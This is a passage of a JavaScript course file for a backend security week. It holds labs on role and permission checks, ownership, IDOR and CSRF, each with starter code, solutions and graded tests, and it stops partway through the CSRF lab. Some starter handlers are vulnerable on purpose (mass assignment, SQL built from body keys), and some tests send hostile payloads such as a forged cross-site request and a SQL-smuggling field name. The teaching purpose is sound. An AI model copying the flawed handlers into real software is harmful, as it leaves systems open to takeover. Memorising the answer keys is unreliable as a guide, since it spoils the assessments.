/**
 * BACKEND ENGINEERING · WEEK 14 · AUTHORIZATION AND APPLICATION SECURITY
 *
 * Curriculum 14.1 – 14.P. RBAC; permission-based access; ownership; the
 * OWASP API Security Top 10; injection, broken access control and IDOR;
 * XSS and CSRF; CORS and security headers; validation and output encoding;
 * secrets; dependency scanning; upload and sensitive-data handling; four
 * exercises (roles, student records, an authorization test matrix, a
 * vulnerable API audit); and a security document.
 *
 * Every lab signs users in with a session cookie whose token is seeded in
 * the database: sid=<name>-session for Ada and Bayo (students), Ngozi and
 * Tunde (instructors) and Kemi (admin). The checks act as each of them.
 *
 * ─────────────────────────────────────────────────────────────────────────
 * THIS FILE IS CLIENT-SAFE. Assessment answers live in lib/academy/.
 * ─────────────────────────────────────────────────────────────────────────
 */

import { decide, pkg, shown, term } from "./be-helpers.js";

export const SECTION_ID = "be-s14-security";
const MODULE = "be-w14-security";

const SEC_PKG = pkg({ name: "course-api", scripts: { start: "node --env-file=.env server.js" }, deps: ["cookie-parser", "express", "pg"] });
const SEC_ENV = "DATABASE_URL=postgresql://academy_app:app-password@localhost:5432/academy\n";
const DB_JS = `import pg from "pg";

export const pool = new pg.Pool({ connectionString: process.env.DATABASE_URL });
`;
const AUTH_JS = `import { createHash } from "node:crypto";
import { pool } from "./db.js";

const hash = (token) => createHash("sha256").update(token).digest("hex");

/** Week 13's session check: req.user = { id, email, fullName, role }, or 401. */
export async function requireAuth(req, res, next) {
  const token = req.cookies?.sid;
  const { rows } = token
    ? await pool.query(
        'SELECT u.id, u.email, u.full_name AS "fullName", u.role FROM sessions s JOIN users u ON u.id = s.user_id WHERE s.token_hash = $1 AND s.expires_at > $2',
        [hash(token), new Date()]
      )
    : { rows: [] };
  if (!rows[0]) return res.status(401).json({ error: { code: "UNAUTHENTICATED", message: "Log in to continue" } });
  req.user = rows[0];
  next();
}
`;
const ERROR_HANDLER_JS = `app.use((err, req, res, next) => {
  if (err.status) return res.status(err.status).json({ error: { code: err.code, message: err.message } });
  console.error(err);
  res.status(500).json({ error: { code: "INTERNAL_ERROR", message: "Something went wrong" } });
});
`;
const LISTEN_JS = `app.listen(3000, () => console.log("Course API on http://localhost:3000"));\n`;
const HEAD_JS = (imports = "") => `import cookieParser from "cookie-parser";
import express from "express";
import { requireAuth } from "./auth.js";
import { pool } from "./db.js";
${imports}
const app = express();
app.use(express.json());
app.use(cookieParser());
`;
const BASE_FILES = { "package.json": SEC_PKG, ".env": SEC_ENV, "db.js": DB_JS, "auth.js": AUTH_JS };
const BASE_RO = ["package.json", ".env", "db.js", "auth.js"];

/** Users (with roles), their sessions, courses, enrollments and payments. */
const SEC_SQL = `CREATE TABLE users (
  id        integer PRIMARY KEY,
  email     text NOT NULL UNIQUE,
  full_name text NOT NULL,
  role      text NOT NULL CHECK (role IN ('student', 'instructor', 'admin')),
  password_hash text NOT NULL DEFAULT '$argon2id$not-shown'
);
CREATE TABLE sessions (token_hash text PRIMARY KEY, user_id integer NOT NULL REFERENCES users (id), expires_at timestamptz NOT NULL);
CREATE TABLE courses (id integer GENERATED ALWAYS AS IDENTITY PRIMARY KEY, code text NOT NULL UNIQUE, title text NOT NULL, instructor_id integer NOT NULL REFERENCES users (id), price integer NOT NULL);
CREATE TABLE enrollments (id integer PRIMARY KEY, student_id integer NOT NULL REFERENCES users (id), course_id integer NOT NULL REFERENCES courses (id), score integer);
CREATE TABLE payments (id integer PRIMARY KEY, student_id integer NOT NULL REFERENCES users (id), amount integer NOT NULL, card_last4 text NOT NULL);

INSERT INTO users (id, email, full_name, role) VALUES
  (1, 'ada@example.com', 'Ada Obi', 'student'),
  (2, 'bayo@example.com', 'Bayo Adeyemi', 'student'),
  (3, 'ngozi@example.com', 'Ngozi Eze', 'instructor'),
  (4, 'tunde@example.com', 'Tunde Bakare', 'instructor'),
  (5, 'kemi@example.com', 'Kemi Lawal', 'admin');
-- Each user's session cookie is sid=<first part of their email>-session (ada-session, …).
INSERT INTO sessions SELECT encode(sha256((split_part(email, '@', 1) || '-session')::bytea), 'hex'), id, '2099-01-01' FROM users;
INSERT INTO courses (code, title, instructor_id, price) VALUES ('BE-101', 'Backend Engineering', 3, 120000), ('DB-101', 'Relational Databases', 3, 80000), ('WD-201', 'React Development', 4, 90000);
INSERT INTO enrollments VALUES (1, 1, 1, NULL), (2, 1, 3, 88), (3, 2, 1, 74), (4, 2, 2, NULL);
INSERT INTO payments VALUES (1, 1, 120000, '4242'), (2, 1, 90000, '4242'), (3, 2, 120000, '1881');
`;

/** A check preamble: as("ada") gives request options with Ada's session cookie. */
const AS = `const as = (who, extra = {}) => ({ ...extra, headers: { ...(extra.headers || {}), Cookie: "sid=" + who + "-session" } });`;

export const LESSONS = [
  /* ═══════════════════════════════════════════════════════════════════
     LESSON 100 · 14.1 – 14.3 · ROLES, PERMISSIONS AND OWNERSHIP
  ═══════════════════════════════════════════════════════════════════ */
  {
    id: "be-l100-access-control",
    moduleId: MODULE,
    sectionId: SECTION_ID,
    order: 1,
    covers: ["14.1", "14.2", "14.3"],
    title: "Roles, Permissions and Resource Ownership",
    subtitle: "What may this user do, and to which records?",
    estimatedMinutes: 85,
    intro: "Authentication says who is asking. Authorization decides what they may do, at three levels: their role, their permissions, and whether the record in question is theirs.",
    atoms: [
      {
        id: "a-be-rbac",
        title: "Role-based access control",
        explain:
          "RBAC gives each user a ROLE (student, instructor, admin) and each route the roles it allows. A middleware factory keeps it declarative: requireRole(\"admin\") returns (req, res, next) => req.user.role is in the list ? next() : 403 FORBIDDEN. Order matters: requireAuth first (401 if nobody), then requireRole (403 if the wrong role). Deny by default: a route with no rule should not be open to everyone by accident.",
        nodeLab: {
          task:
            "Write requireRole(...roles) in roles.js (403 FORBIDDEN \"You do not have permission to do this\" unless req.user.role is one of the roles) and protect the routes in server.js: POST /courses for instructors and admins; DELETE /courses/:id and GET /admin/users for admins only. GET /courses stays public.",
          db: SEC_SQL,
          files: {
            ...BASE_FILES,
            "roles.js": "export function requireRole(...roles) {\n  return (req, res, next) => next();\n}\n",
            "server.js": `${HEAD_JS('import { requireRole } from "./roles.js";\n')}
app.get("/courses", async (req, res) => res.json({ data: (await pool.query("SELECT id, code, title FROM courses ORDER BY id")).rows }));

app.post("/courses", requireAuth, async (req, res) => {
  const { rows } = await pool.query("INSERT INTO courses (code, title, instructor_id, price) VALUES ($1, $2, $3, $4) RETURNING id, code", [req.body.code, req.body.title, req.user.id, req.body.price]);
  res.status(201).json({ data: rows[0] });
});

app.delete("/courses/:id", requireAuth, async (req, res) => {
  await pool.query("DELETE FROM enrollments WHERE course_id = $1", [Number(req.params.id)]);
  await pool.query("DELETE FROM courses WHERE id = $1", [Number(req.params.id)]);
  res.status(204).end();
});

app.get("/admin/users", requireAuth, async (req, res) => res.json({ data: (await pool.query("SELECT id, email, role FROM users ORDER BY id")).rows }));

${ERROR_HANDLER_JS}
${LISTEN_JS}`,
          },
          readOnly: BASE_RO,
          open: "roles.js",
          solution: {
            "roles.js": `/** Allows the request only if the logged-in user has one of the roles (use after requireAuth). */
export function requireRole(...roles) {
  return (req, res, next) => {
    if (!req.user || !roles.includes(req.user.role)) {
      return res.status(403).json({ error: { code: "FORBIDDEN", message: "You do not have permission to do this" } });
    }
    next();
  };
}
`,
            "server.js": `${HEAD_JS('import { requireRole } from "./roles.js";\n')}
app.get("/courses", async (req, res) => res.json({ data: (await pool.query("SELECT id, code, title FROM courses ORDER BY id")).rows }));

app.post("/courses", requireAuth, requireRole("instructor", "admin"), async (req, res) => {
  const { rows } = await pool.query("INSERT INTO courses (code, title, instructor_id, price) VALUES ($1, $2, $3, $4) RETURNING id, code", [req.body.code, req.body.title, req.user.id, req.body.price]);
  res.status(201).json({ data: rows[0] });
});

app.delete("/courses/:id", requireAuth, requireRole("admin"), async (req, res) => {
  await pool.query("DELETE FROM enrollments WHERE course_id = $1", [Number(req.params.id)]);
  await pool.query("DELETE FROM courses WHERE id = $1", [Number(req.params.id)]);
  res.status(204).end();
});

app.get("/admin/users", requireAuth, requireRole("admin"), async (req, res) => res.json({ data: (await pool.query("SELECT id, email, role FROM users ORDER BY id")).rows }));

${ERROR_HANDLER_JS}
${LISTEN_JS}`,
          },
          tests: [
            { label: "Students cannot create, delete or list users (403)", check: `${AS} eq((await post("/courses", { code: "X-101", title: "X", price: 0 }, as("ada"))).status, 403, "POST /courses as a student"); eq((await del("/courses/3", as("ada"))).status, 403, "DELETE as a student"); const r = await get("/admin/users", as("bayo")); eq([r.status, r.json?.error?.code], [403, "FORBIDDEN"], "GET /admin/users as a student");` },
            { label: "Instructors create courses but cannot delete or list users", check: `${AS} eq((await post("/courses", { code: "AI-101", title: "AI", price: 0 }, as("ngozi"))).status, 201, "POST as an instructor"); eq((await del("/courses/3", as("tunde"))).status, 403, "DELETE as an instructor"); eq((await get("/admin/users", as("tunde"))).status, 403, "GET /admin/users as an instructor");` },
            { label: "Admins can do all three", check: `${AS} eq((await post("/courses", { code: "OPS-101", title: "Ops", price: 0 }, as("kemi"))).status, 201, "POST as admin"); eq((await get("/admin/users", as("kemi"))).json.data.length, 5, "GET /admin/users as admin"); eq((await del("/courses/3", as("kemi"))).status, 204, "DELETE as admin");` },
            { label: "Anonymous → 401; public stays public", check: `eq((await post("/courses", { code: "Z-1", title: "Z", price: 0 })).status, 401, "POST without a session"); eq((await get("/admin/users")).status, 401, "GET /admin/users without a session"); eq((await get("/courses")).status, 200, "GET /courses is public");` },
          ],
          hint: "requireRole returns a middleware: (req, res, next) => roles.includes(req.user?.role) ? next() : res.status(403).json(…). Put it after requireAuth on each protected route.",
          successMessage: "Every protected route says, in one line, who may use it; the order requireAuth → requireRole gives 401 and 403 their right meanings.",
        },
      },
      {
        id: "a-be-permission-based",
        title: "Permission-based access control",
        explain:
          "Roles get coarse quickly ('instructors can edit courses but only admins can refund, except finance staff…'). PERMISSIONS name actions (course:create, course:update, course:delete, report:read) and a table maps each role to its permissions; routes require a PERMISSION, not a role. Adding a role, or moving an action between roles, then changes one table instead of every route. can(user, permission) is the single place the decision is made, which also makes it easy to unit-test.",
        nodeLab: {
          task:
            "In permissions.js, define ROLE_PERMISSIONS (student: course:read; instructor: course:read, course:create, course:update; admin: every permission, written as \"*\"), can(user, permission), and requirePermission(permission) (403 FORBIDDEN otherwise). Then use requirePermission in server.js: POST /courses course:create, PATCH /courses/:id course:update, DELETE /courses/:id course:delete, GET /reports/revenue report:read.",
          db: SEC_SQL,
          files: {
            ...BASE_FILES,
            "permissions.js": "export const ROLE_PERMISSIONS = {};\n\nexport function can(user, permission) {\n  return true;\n}\n\nexport function requirePermission(permission) {\n  return (req, res, next) => next();\n}\n",
            "server.js": `${HEAD_JS('import { requirePermission } from "./permissions.js";\n')}
app.post("/courses", requireAuth, async (req, res) => {
  const { rows } = await pool.query("INSERT INTO courses (code, title, instructor_id, price) VALUES ($1, $2, $3, $4) RETURNING id, code", [req.body.code, req.body.title, req.user.id, req.body.price]);
  res.status(201).json({ data: rows[0] });
});

app.patch("/courses/:id", requireAuth, async (req, res) => {
  const { rows } = await pool.query("UPDATE courses SET title = coalesce($2, title) WHERE id = $1 RETURNING id, code, title", [Number(req.params.id), req.body.title]);
  res.json({ data: rows[0] });
});

app.delete("/courses/:id", requireAuth, async (req, res) => {
  await pool.query("DELETE FROM enrollments WHERE course_id = $1", [Number(req.params.id)]);
  await pool.query("DELETE FROM courses WHERE id = $1", [Number(req.params.id)]);
  res.status(204).end();
});

app.get("/reports/revenue", requireAuth, async (req, res) => {
  res.json({ data: (await pool.query("SELECT sum(amount)::int AS total FROM payments")).rows[0] });
});

${ERROR_HANDLER_JS}
${LISTEN_JS}`,
          },
          readOnly: BASE_RO,
          open: "permissions.js",
          solution: {
            "permissions.js": `/** What each role may do. Routes ask for a permission, never for a role. */
export const ROLE_PERMISSIONS = {
  student: ["course:read"],
  instructor: ["course:read", "course:create", "course:update"],
  admin: ["*"],
};

export function can(user, permission) {
  const granted = ROLE_PERMISSIONS[user?.role] ?? [];
  return granted.includes("*") || granted.includes(permission);
}

export function requirePermission(permission) {
  return (req, res, next) => {
    if (!can(req.user, permission)) {
      return res.status(403).json({ error: { code: "FORBIDDEN", message: "You do not have permission to do this" } });
    }
    next();
  };
}
`,
            "server.js": `${HEAD_JS('import { requirePermission } from "./permissions.js";\n')}
app.post("/courses", requireAuth, requirePermission("course:create"), async (req, res) => {
  const { rows } = await pool.query("INSERT INTO courses (code, title, instructor_id, price) VALUES ($1, $2, $3, $4) RETURNING id, code", [req.body.code, req.body.title, req.user.id, req.body.price]);
  res.status(201).json({ data: rows[0] });
});

app.patch("/courses/:id", requireAuth, requirePermission("course:update"), async (req, res) => {
  const { rows } = await pool.query("UPDATE courses SET title = coalesce($2, title) WHERE id = $1 RETURNING id, code, title", [Number(req.params.id), req.body.title]);
  res.json({ data: rows[0] });
});

app.delete("/courses/:id", requireAuth, requirePermission("course:delete"), async (req, res) => {
  await pool.query("DELETE FROM enrollments WHERE course_id = $1", [Number(req.params.id)]);
  await pool.query("DELETE FROM courses WHERE id = $1", [Number(req.params.id)]);
  res.status(204).end();
});

app.get("/reports/revenue", requireAuth, requirePermission("report:read"), async (req, res) => {
  res.json({ data: (await pool.query("SELECT sum(amount)::int AS total FROM payments")).rows[0] });
});

${ERROR_HANDLER_JS}
${LISTEN_JS}`,
          },
          tests: [
            { label: "can() follows the table", check: `const { can } = await load("permissions.js"); const s = { role: "student" }, i = { role: "instructor" }, a = { role: "admin" }; eq([can(s, "course:read"), can(s, "course:create"), can(i, "course:update"), can(i, "course:delete"), can(a, "report:read"), can({ role: "ghost" }, "course:read"), can(undefined, "course:read")], [true, false, true, false, true, false, false], "student, instructor, admin, an unknown role, nobody");` },
            { label: "Instructors create and update, but cannot delete or read revenue", check: `${AS} eq((await post("/courses", { code: "AI-101", title: "AI", price: 0 }, as("ngozi"))).status, 201, "create"); eq((await patch("/courses/1", { title: "Backend Engineering (2027)" }, as("ngozi"))).status, 200, "update"); eq((await del("/courses/1", as("ngozi"))).status, 403, "delete"); eq((await get("/reports/revenue", as("ngozi"))).status, 403, "revenue report");` },
            { label: "Students can do none of them; admins all", check: `${AS} for (const [m, p] of [["POST", "/courses"], ["PATCH", "/courses/1"], ["DELETE", "/courses/2"], ["GET", "/reports/revenue"]]) eq((await request(m, p, as("ada", m === "GET" || m === "DELETE" ? {} : { json: { code: "S-1", title: "S", price: 0 } }))).status, 403, m + " " + p + " as a student"); eq((await get("/reports/revenue", as("kemi"))).json, { data: { total: 330000 } }, "the revenue report as admin"); eq((await del("/courses/3", as("kemi"))).status, 204, "delete as admin");` },
          ],
          hint: "can: const granted = ROLE_PERMISSIONS[user?.role] ?? []; return granted.includes(\"*\") || granted.includes(permission). requirePermission wraps can in a middleware.",
          successMessage: "Moving 'delete courses' to a new 'content manager' role would now be one line in ROLE_PERMISSIONS, and no route would change.",
        },
      },
      {
        id: "a-be-ownership",
        title: "Resource ownership and access checks",
        explain:
          "Roles and permissions say what KIND of action is allowed; OWNERSHIP says on WHICH records. An instructor may update courses, but only their own: the check needs the record (course.instructor_id === req.user.id), so it lives in the handler or service after loading it, with an exception for admins. Write it once (assertCanManage(user, course)) and call it everywhere a course is changed. Choose the status deliberately: 403 when the user may know the record exists (a course catalogue), 404 when even its existence is private (another student's enrollment).",
        nodeLab: {
          task:
            "Instructors may change only their own courses. Write assertCanManage(user, course) in policy.js: it allows admins and the course's instructor, and otherwise throws an error with status 403 and code NOT_COURSE_OWNER. Use it in PATCH /courses/:id and in GET /courses/:id/roster (the course's students: instructor of that course or admin only). Missing courses stay 404.",
          db: SEC_SQL,
          files: {
            ...BASE_FILES,
            "policy.js": "export function assertCanManage(user, course) {}\n",
            "server.js": `${HEAD_JS('import { assertCanManage } from "./policy.js";\n')}
async function findCourse(id) {
  const { rows } = await pool.query("SELECT id, code, title, instructor_id FROM courses WHERE id = $1", [Number(id)]);
  if (!rows[0]) throw Object.assign(new Error("No such course"), { status: 404, code: "COURSE_NOT_FOUND" });
  return rows[0];
}

app.patch("/courses/:id", requireAuth, async (req, res) => {
  const course = await findCourse(req.params.id);
  const { rows } = await pool.query("UPDATE courses SET title = coalesce($2, title) WHERE id = $1 RETURNING id, code, title", [course.id, req.body.title]);
  res.json({ data: rows[0] });
});

app.get("/courses/:id/roster", requireAuth, async (req, res) => {
  const course = await findCourse(req.params.id);
  const { rows } = await pool.query("SELECT u.full_name AS \\"fullName\\", e.score FROM enrollments e JOIN users u ON u.id = e.student_id WHERE e.course_id = $1 ORDER BY u.id", [course.id]);
  res.json({ data: rows });
});

${ERROR_HANDLER_JS}
${LISTEN_JS}`,
          },
          readOnly: BASE_RO,
          open: "policy.js",
          solution: {
            "policy.js": `/** Admins manage every course; instructors only their own. Throws 403 otherwise. */
export function assertCanManage(user, course) {
  if (user.role === "admin") return;
  if (user.role === "instructor" && course.instructor_id === user.id) return;
  throw Object.assign(new Error("Only the course's instructor can do this"), { status: 403, code: "NOT_COURSE_OWNER" });
}
`,
            "server.js": `${HEAD_JS('import { assertCanManage } from "./policy.js";\n')}
async function findCourse(id) {
  const { rows } = await pool.query("SELECT id, code, title, instructor_id FROM courses WHERE id = $1", [Number(id)]);
  if (!rows[0]) throw Object.assign(new Error("No such course"), { status: 404, code: "COURSE_NOT_FOUND" });
  return rows[0];
}

app.patch("/courses/:id", requireAuth, async (req, res) => {
  const course = await findCourse(req.params.id);
  assertCanManage(req.user, course);
  const { rows } = await pool.query("UPDATE courses SET title = coalesce($2, title) WHERE id = $1 RETURNING id, code, title", [course.id, req.body.title]);
  res.json({ data: rows[0] });
});

app.get("/courses/:id/roster", requireAuth, async (req, res) => {
  const course = await findCourse(req.params.id);
  assertCanManage(req.user, course);
  const { rows } = await pool.query("SELECT u.full_name AS \\"fullName\\", e.score FROM enrollments e JOIN users u ON u.id = e.student_id WHERE e.course_id = $1 ORDER BY u.id", [course.id]);
  res.json({ data: rows });
});

${ERROR_HANDLER_JS}
${LISTEN_JS}`,
          },
          tests: [
            { label: "An instructor manages their own course", check: `${AS} eq((await patch("/courses/1", { title: "Backend Engineering II" }, as("ngozi"))).status, 200, "Ngozi updates BE-101 (hers)"); eq((await get("/courses/1/roster", as("ngozi"))).json.data, [{ fullName: "Ada Obi", score: null }, { fullName: "Bayo Adeyemi", score: 74 }], "her roster");` },
            { label: "…but not another instructor's", check: `${AS} const r = await patch("/courses/1", { title: "Taken over" }, as("tunde")); eq([r.status, r.json?.error?.code], [403, "NOT_COURSE_OWNER"], "Tunde updates Ngozi's course"); eq((await get("/courses/1/roster", as("tunde"))).status, 403, "Tunde reads Ngozi's roster"); eq(await sql("SELECT title FROM courses WHERE id = 1"), [{ title: "Backend Engineering II" }], "the title did not change");` },
            { label: "Students are refused; admins allowed; missing courses 404", check: `${AS} eq((await patch("/courses/3", { title: "Student edit" }, as("ada"))).status, 403, "a student"); eq((await get("/courses/3/roster", as("kemi"))).status, 200, "admin reads any roster"); eq((await patch("/courses/3", { title: "React Development 2" }, as("kemi"))).status, 200, "admin updates any course"); eq((await patch("/courses/99", { title: "x" }, as("ngozi"))).status, 404, "a missing course");` },
          ],
          hint: "assertCanManage: return for admins and for instructors whose id equals course.instructor_id; otherwise throw Object.assign(new Error(…), { status: 403, code: \"NOT_COURSE_OWNER\" }). Call it right after findCourse.",
          successMessage: "Instructors still have the same permission, but it now applies only to their own courses: the most common rule in every multi-user system.",
        },
      },
    ],
    requirements: { read: true, video: false, assessment: true },
  },

  /* ═══════════════════════════════════════════════════════════════════
     LESSON 101 · 14.4 – 14.5 · OWASP API RISKS, INJECTION, IDOR
  ═══════════════════════════════════════════════════════════════════ */
  {
    id: "be-l101-owasp",
    moduleId: MODULE,
    sectionId: SECTION_ID,
    order: 2,
    covers: ["14.4", "14.5"],
    title: "OWASP API Risks, Injection, Broken Access Control and IDOR",
    subtitle: "The mistakes attackers look for first",
    estimatedMinutes: 65,
    intro: "OWASP's API Security Top 10 lists how APIs actually get breached. Most entries are access-control mistakes, which no framework prevents for you.",
    atoms: [
      {
        id: "a-be-owasp",
        title: "OWASP API Security risks",
        explain:
          "The OWASP API Security Top 10 (2023): API1 Broken Object Level Authorization (BOLA, or IDOR: change the id in the URL and get someone else's record); API2 Broken Authentication; API3 Broken Object Property Level Authorization (reading or writing fields you should not: mass assignment, password hashes in responses); API4 Unrestricted Resource Consumption (no limits, no pagination); API5 Broken Function Level Authorization (a student calling an admin endpoint); API6 Unrestricted Access to Sensitive Business Flows; API7 Server-Side Request Forgery; API8 Security Misconfiguration; API9 Improper Inventory Management (forgotten old versions); API10 Unsafe Consumption of APIs (trusting third-party data). Injection (Week 11) falls under misconfiguration and unsafe consumption here, and remains in the general OWASP Top 10.",
        decision: decide({
          scenario: "GET /payments/2 returns a payment. A student changes the URL to /payments/3 and sees another student's card digits and amount.",
          question: "Which OWASP API risk is this, and what is the fix?",
          right: ["API1 Broken Object Level Authorization (IDOR): check that the payment belongs to the requester (or that they are an admin) before returning it", "The most common API breach."],
          wrong: [
            ["API2 Broken Authentication: make passwords stronger", "The student is correctly authenticated."],
            ["API4 Unrestricted Resource Consumption: add rate limiting", "Slows the attack, does not stop it."],
            ["Use UUIDs instead of numbers", "Harder to guess, still unprotected: ids leak in links and logs."],
          ],
          at: 0,
          aftermath: "Random ids are a fine extra layer, never the access check itself.",
        }),
      },
      {
        id: "a-be-idor-mass-assignment",
        title: "SQL injection, broken access control and IDOR",
        explain:
          "Three classic failures in one endpoint: PATCH /users/:id lets any user update ANY user (IDOR: the id comes from the URL and nobody checks it), and copies every field of the body into the row (MASS ASSIGNMENT: a student sends { \"role\": \"admin\" }), and builds the SQL by joining column names from the body (INJECTION through identifiers). The fix is the same discipline as Week 6: decide which record the caller may touch, and which fields they may set, with an allow-list, then use parameters for every value.",
        nodeLab: {
          task:
            "PATCH /users/:id has all three problems. Fix it: a user may update only themselves (others → 404 USER_NOT_FOUND, as if the user did not exist), except admins, who may update anyone; ordinary users may set only fullName and email; only admins may set role (one of student, instructor, admin). Build the SQL from that allow-list with parameters for every value. Answer { data: { id, email, fullName, role } }.",
          db: SEC_SQL,
          files: {
            ...BASE_FILES,
            "server.js": `${HEAD_JS()}
const COLUMNS = { fullName: "full_name", email: "email", role: "role" };

app.patch("/users/:id", requireAuth, async (req, res) => {
  const fields = Object.keys(req.body);
  const sets = fields.map((f, i) => \`\${COLUMNS[f] ?? f} = $\${i + 2}\`).join(", ");
  const { rows } = await pool.query(
    \`UPDATE users SET \${sets} WHERE id = $1 RETURNING id, email, full_name AS "fullName", role\`,
    [Number(req.params.id), ...fields.map((f) => req.body[f])]
  );
  res.json({ data: rows[0] });
});

${ERROR_HANDLER_JS}
${LISTEN_JS}`,
          },
          readOnly: BASE_RO,
          open: "server.js",
          solution: {
            "server.js": `${HEAD_JS()}
const ROLES = ["student", "instructor", "admin"];
const notFound = () => Object.assign(new Error("No such user"), { status: 404, code: "USER_NOT_FOUND" });
const invalid = (message) => Object.assign(new Error(message), { status: 400, code: "VALIDATION_FAILED" });

app.patch("/users/:id", requireAuth, async (req, res) => {
  const id = Number(req.params.id);
  const isAdmin = req.user.role === "admin";
  // Object level: yourself, unless you are an admin. Others look like they do not exist.
  if (id !== req.user.id && !isAdmin) throw notFound();
  // Property level: an allow-list of fields per role, mapped to fixed column names.
  const allowed = isAdmin ? { fullName: "full_name", email: "email", role: "role" } : { fullName: "full_name", email: "email" };
  const changes = Object.entries(allowed).filter(([field]) => req.body?.[field] !== undefined);
  if (req.body?.role !== undefined && isAdmin && !ROLES.includes(req.body.role)) throw invalid("role must be student, instructor or admin");
  if (changes.length === 0) throw invalid("Nothing to update");
  const sets = changes.map(([, column], i) => \`\${column} = $\${i + 2}\`).join(", ");
  const { rows } = await pool.query(
    \`UPDATE users SET \${sets} WHERE id = $1 RETURNING id, email, full_name AS "fullName", role\`,
    [id, ...changes.map(([field]) => req.body[field])]
  );
  if (!rows[0]) throw notFound();
  res.json({ data: rows[0] });
});

${ERROR_HANDLER_JS}
${LISTEN_JS}`,
          },
          tests: [
            { label: "A user updates their own name", check: `${AS} const r = await patch("/users/1", { fullName: "Ada O. Obi" }, as("ada")); eq([r.status, r.json?.data], [200, { id: 1, email: "ada@example.com", fullName: "Ada O. Obi", role: "student" }], "Ada renames herself");` },
            { label: "…but not anyone else (IDOR)", check: `${AS} const r = await patch("/users/2", { fullName: "Hacked" }, as("ada")); eq([r.status, r.json?.error?.code], [404, "USER_NOT_FOUND"], "Ada updates Bayo"); eq(await sql("SELECT full_name FROM users WHERE id = 2"), [{ full_name: "Bayo Adeyemi" }], "Bayo is unchanged");` },
            { label: "No mass assignment: students cannot make themselves admin", check: `${AS} await patch("/users/1", { fullName: "Ada", role: "admin" }, as("ada")); eq(await sql("SELECT role FROM users WHERE id = 1"), [{ role: "student" }], "role ignored for students"); const r = await patch("/users/1", { role: "admin" }, as("ada")); assert(r.status >= 400, "a body with only role is refused for a student");` },
            { label: "Admins can update anyone, including roles", check: `${AS} eq((await patch("/users/2", { role: "instructor" }, as("kemi"))).json?.data?.role, "instructor", "admin promotes Bayo"); eq((await patch("/users/2", { role: "superuser" }, as("kemi"))).status, 400, "an unknown role");` },
            { label: "Unknown body keys cannot reach the SQL", check: `${AS} const r = await patch("/users/1", { "full_name = 'x', role": "admin" }, as("ada")); assert(r.status === 400, "a key that is not an allowed field must not become SQL"); eq(await sql("SELECT role FROM users WHERE id = 1"), [{ role: "student" }], "still a student");` },
          ],
          hint: "Check id === req.user.id || admin first (404 otherwise). Then build the list of [field, column] pairs from an allow-list that depends on the role, and only those go into the SET clause, with $2, $3… for the values.",
          successMessage: "One endpoint, three classic vulnerabilities closed: object-level access, property-level access, and SQL that can only contain the columns you wrote.",
        },
      },
    ],
    requirements: { read: true, video: false, assessment: true },
  },

  /* ═══════════════════════════════════════════════════════════════════
     LESSON 102 · 14.6 – 14.7 · XSS, CSRF, CORS AND SECURITY HEADERS
  ═══════════════════════════════════════════════════════════════════ */
  {
    id: "be-l102-browser-security",
    moduleId: MODULE,
    sectionId: SECTION_ID,
    order: 3,
    covers: ["14.6", "14.7"],
    title: "XSS, CSRF, CORS and Security Headers",
    subtitle: "When the client is a browser",
    estimatedMinutes: 70,
    intro: "Browsers run code from many sites side by side and attach cookies automatically. That convenience creates attacks an API must defend against even though it serves only JSON.",
    atoms: [
      {
        id: "a-be-csrf",
        title: "Cross-site scripting and cross-site request forgery",
        explain:
          "XSS: attacker-controlled text is shown as HTML or script in your site, and runs with the user's session (Lesson 103 encodes output). CSRF: a page on evil.example makes the user's browser send a request to your API; with cookie authentication the browser attaches the cookie, so the request is 'from' the user. Defences: SameSite=Lax cookies (most cross-site POSTs carry no cookie), and checking the ORIGIN header on state-changing requests: browsers send Origin on cross-site requests and cannot be made to forge it. Token-based APIs (Authorization header) are not exposed to CSRF, because browsers never add that header by themselves.",
        nodeLab: {
          task:
            "Add a CSRF guard to server.js (before the routes): for POST, PUT, PATCH and DELETE requests that carry an Origin header, refuse with 403 CSRF_REJECTED unless the origin is in ALLOWED_ORIGINS (from .env, comma-separated). Requests without an Origin (curl, other servers) and GET requests pass.",
          db: SEC_SQL,
          files: {
            ...BASE_FILES,
            ".env": `${SEC_ENV}ALLOWED_ORIGINS=https://academy.example,https://admin.academy.example\n`,
            "server.js": `${HEAD_JS()}
// CSRF guard here

app.get("/me", requireAuth, (req, res) => res.json({ data: req.user }));

app.post("/me/email", requireAuth, async (req, res) => {
  await pool.query("UPDATE users SET email = $2 WHERE id = $1", [req.user.id, req.body.email]);
  res.status(204).end();
});

${ERROR_HANDLER_JS}
${LISTEN_JS}`,
          },
          readOnly: ["package.json", ".env", "db.js", "auth.js"],
          open: "server.js",
          solution: {
            "server.js": `${HEAD_JS()}
const ALLOWED_ORIGINS = new Set(String(process.env.ALLOWED_ORIGINS ?? "").split(",").map((o) => o.trim()).filter(Boolean));
const UNSAFE = new Set(["POST", "PUT", "PATCH", "DELETE"]);

// Browsers send Origin on cross-site requests and a page cannot forge it.
app.use((req, res, next) => {
  const origin = req.get("origin");
  if (UNSAFE.has(req.method) && origin && !ALLOWED_ORIGINS.has(origin)) {
    return res.status(403).json({ error: { code: "CSRF_REJECTED", message: "Cross-site request refused" } });
  }
  next();
});

app.get("/me", requireAuth, (req, res) => res.json({ data: req.user }));

app.post("/me/email", requireAuth, async (req, res) => {
  await pool.query("UPDATE users SET email = $2 WHERE id = $1", [req.user.id, req.body.email]);
  res.status(204).end();
});

${ERROR_HANDLER_JS}
${LISTEN_JS}`,
          },
          tests: [
            { label: "A cross-site POST with Ada's cookie is refused", check: `${AS} const r = await post("/me/email", { email: "attacker@evil.example" }, as("ada", { headers: { Origin: "https://evil.example" } })); eq([r.status, r.json?.error?.code], [403, "CSRF_REJECTED"], "POST from evil.example"); eq(await sql("SELECT email FROM users WHERE id = 1"), [{ email: "ada@example.com" }], "Ada's email is unchanged");` },
            { label: "The academy's own sites are allowed", check: `${AS} eq((await post("/me/email", { email: "ada.obi@example.com" }, as("ada", { headers: { Origin: "https://academy.example" } }))).status, 204, "from academy.example"); eq((await post("/me/email", { email: "ada@example.com" }, as("ada", { headers: { Origin: "https://admin.academy.example" } }))).status, 204, "from admin.academy.example");` },
            { label: "Requests without Origin, and GETs, pass", check: `${AS} eq((await post("/me/email", { email: "ada@example.com" }, as("ada"))).status, 204, "no Origin (curl, a server)"); eq((await get("/me", as("ada", { headers: { Origin: "https://evil.example" } }))).status, 200, "a GET from another site is not blocked (it changes nothing)"); eq((await request("DELETE", "/me/email", as("ada", { headers: { Origin: "https://academy.example.evil.net" } }))).status, 403, "a look-alike origin");` },
          ],
